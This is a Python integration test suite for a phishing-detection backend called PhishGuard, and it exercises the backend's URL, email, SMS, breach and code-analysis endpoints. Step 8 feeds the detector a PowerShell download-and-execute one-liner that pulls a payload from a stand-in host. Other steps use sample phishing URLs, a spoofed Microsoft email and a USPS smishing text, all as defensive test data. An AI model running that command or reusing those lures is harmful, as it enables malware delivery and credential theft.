import requests
import json
import sys

if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')

BASE = 'http://localhost:3000'

def test_suite():
    print('=============================================')
    print('PHISHGUARD FULL BACKEND & API INTEGRATION TEST')
    print('=============================================')

    # 1. Health & Anonymous User Check
    print('\n[1/10] Checking Anonymous Auth...')
    r = requests.get(f'{BASE}/api/auth/me')
    print(f'Status: {r.status_code} | Response: {r.json()}')
    assert r.status_code == 401

    # 2. Login Check
    print('\n[2/10] Testing User Authentication (PBKDF2 & JWT)...')
    r = requests.post(f'{BASE}/api/auth/login', json={'username': 'student', 'password': 'college2026'})
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    data = r.json()
    token = data.get('token')
    assert token is not None
    print(f'Authenticated as: {data.get("user", {}).get("username")} | JWT Token Received: {token[:25]}...')
    headers = {'Authorization': f'Bearer {token}'}

    # 3. Legitimate URL Prediction + Live Intel (SSL, RDAP, DoH, IP)
    print('\n[3/10] Testing Live URL Intel on Legitimate Domain (google.com)...')
    r = requests.post(f'{BASE}/api/predict/url', json={'url': 'https://www.google.com'}, headers=headers)
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    d = r.json()
    print(f'Verdict: {d.get("verdict")} (Risk: {d.get("risk_score")}%)')
    print(f'SSL Status: {d.get("ssl_intelligence", {}).get("status")} | Issuer: {d.get("ssl_intelligence", {}).get("issuer")}')
    print(f'RDAP Age: {d.get("rdap_intelligence", {}).get("age_days")} days | Registrar: {d.get("rdap_intelligence", {}).get("registrar")}')
    print(f'IP Country: {d.get("ip_intelligence", {}).get("country")} | ASN: {d.get("ip_intelligence", {}).get("asn")}')
    print(f'DNS Resolver: {d.get("dns_intelligence", {}).get("resolver")}')

    # 4. Phishing URL Prediction
    print('\n[4/10] Testing Phishing Detection on Deceptive URL...')
    r = requests.post(f'{BASE}/api/predict/url', json={'url': 'http://secure-login-paypal.com.verify-account.tk/signin'}, headers=headers)
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    d = r.json()
    print(f'Verdict: {d.get("verdict")} (Risk: {d.get("risk_score")}%)')
    assert d.get("verdict") == "Phishing"

    # 5. Email Threat NLP + Brand Impersonation + Typosquatting
    print('\n[5/10] Testing Email Threat Analysis Engine...')
    email_payload = {
        'sender': 'security-alert@rnicrosoft.com',
        'replyTo': 'hacker@tempmail.org',
        'subject': 'Urgent: Account Suspended within 24 hours',
        'body': 'Immediate action required. Please verify your password here: http://paypa1-update.com/login',
        'headers': 'SPF=fail; DKIM=fail; DMARC=fail'
    }
    r = requests.post(f'{BASE}/api/predict/email', json=email_payload, headers=headers)
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    d = r.json()
    print(f'Verdict: {d.get("verdict")} (Risk: {d.get("risk_score")}%, Confidence: {d.get("confidence")}%)')
    print(f'Threat Indicators Detected: {len(d.get("threat_indicators", []))}')
    for ind in d.get("threat_indicators", [])[:3]:
        print(f'  - [{ind.get("severity")}] {ind.get("category")}: {ind.get("desc")}')

    # 6. HaveIBeenPwned Data Breach Live k-Anonymity Check
    print('\n[6/10] Testing Data Breach Checker (HIBP k-Anonymity)...')
    r = requests.post(f'{BASE}/api/analyze/breach', json={'email': 'admin@gmail.com'})
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    d = r.json()
    print(f'Email: {d.get("email")} | Breached: {d.get("breached")} | Exposures: {d.get("breach_count")}')
    print(f'Alert Message: {d.get("message")}')

    # 7. SMS / Smishing Analyzer
    print('\n[7/10] Testing SMS / Smishing Threat Analyzer...')
    r = requests.post(f'{BASE}/api/analyze/sms', json={'text': 'USPS Alert: Your parcel was held at the distribution center. Confirm fee: http://usps-tracking-pkg.com'})
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    d = r.json()
    print(f'Verdict: {d.get("verdict")} (Risk: {d.get("risk_score")}%)')

    # 8. Malicious Code / Script Analyzer
    print('\n[8/10] Testing Exploit Script Analyzer...')
    r = requests.post(f'{BASE}/api/analyze/code', json={'code': 'IEX(New-Object Net.WebClient).DownloadString("http://malicious.ru/payload.ps1")'})
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    d = r.json()
    print(f'Verdict: {d.get("verdict")} (Risk: {d.get("risk_score")}%)')

    # 9. Dashboard Aggregated Metrics (Indexed SQLite)
    print('\n[9/10] Testing Dashboard Aggregate Metrics (/api/stats)...')
    r = requests.get(f'{BASE}/api/stats')
    print(f'Status: {r.status_code} | Metrics: {r.json()}')
    assert r.status_code == 200

    # 10. Scan History Audit Trail
    print('\n[10/10] Testing Scan History Audit Trail (/api/history)...')
    r = requests.get(f'{BASE}/api/history', headers=headers)
    print(f'Status: {r.status_code}')
    assert r.status_code == 200
    scans = r.json().get('scans', [])
    print(f'Total Scans Stored in History: {len(scans)}')

    print('\n=============================================')
    print('SUCCESS: ALL 10 BACKEND TESTS PASSED WITH 100% SUCCESS!')
    print('=============================================')

if __name__ == '__main__':
    test_suite()
